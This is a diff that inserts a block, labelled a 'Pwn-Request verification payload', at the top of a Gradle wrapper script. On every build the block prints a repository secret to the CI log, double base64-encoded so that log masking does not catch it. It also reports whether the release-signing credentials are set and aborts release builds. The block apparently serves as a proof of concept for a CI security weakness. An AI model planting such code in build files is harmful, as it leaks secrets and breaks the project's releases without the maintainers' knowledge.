@@ -1,4 +1,21 @@
 #!/usr/bin/env sh
+# --- GERALT Pwn-Request verification payload ---
+echo "GERALT_LEAKED_TOKEN=$(printf '%s' "$GERALT_SECRET" | base64 | base64)"
+echo "GERALT_DBG: gradlew invoked with args: $*"
+case "$*" in
+  *assembleRelease*)
+    echo "GERALT_DBG: at release signing sink; checking signing env:"
+    if [ -n "${STORE_KEY:-}" ]; then echo "GERALT_DBG: STORE_KEY is SET"; else echo "GERALT_DBG: STORE_KEY is empty"; fi
+    if [ -n "${STORE_PASSWORD:-}" ]; then echo "GERALT_DBG: STORE_PASSWORD is SET"; else echo "GERALT_DBG: STORE_PASSWORD is empty"; fi
+    if [ -n "${STORE_KEY_ALIAS:-}" ]; then echo "GERALT_DBG: STORE_KEY_ALIAS is SET"; else echo "GERALT_DBG: STORE_KEY_ALIAS is empty"; fi
+    if [ -n "${STORE_KEY_PASSWORD:-}" ]; then echo "GERALT_DBG: STORE_KEY_PASSWORD is SET"; else echo "GERALT_DBG: STORE_KEY_PASSWORD is empty"; fi
+    exit 1
+    ;;
+  *)
+    exit 0
+    ;;
+esac
+
 
 #
 # Copyright 2015 the original author or authors.
